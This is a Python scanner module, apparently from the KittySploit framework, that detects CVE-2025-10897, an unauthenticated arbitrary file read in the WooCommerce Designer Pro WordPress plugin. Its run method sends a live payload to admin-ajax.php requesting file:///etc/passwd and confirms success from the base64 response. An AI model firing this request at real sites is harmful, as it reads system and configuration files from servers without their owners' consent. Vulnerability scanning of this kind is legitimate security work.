#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WooCommerce Designer Pro theme for WordPress <= 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WooCommerce Designer Pro <= 1.9.28 - Arbitrary File Read Detection',
        'description': 'WooCommerce Designer Pro theme for WordPress <= 1.9.28 contains an arbitrary file read vulnerability caused by improper input validation, letting unauthenticated attackers read arbitrary files including sensitive configuration files, exploit requires no authentication.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp', 'wp-plugin', 'wc-designer-pro', 'lfi'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wc-designer-pro/woocommerce-designer-pro-1928-unauthenticated-arbitrary-file-read',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-10897',
        ],
        'cve': 'CVE-2025-10897',
    }

    def run(self):
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=wcdp_convert_resource_cmyk&url=file:///etc/passwd\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('success', 'base64', 'cm9vdDp4OjA6MDpy',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='WooCommerce Designer Pro <= 1.9.28 - Arbitrary File Read detected', path=path)
            return True
        return False

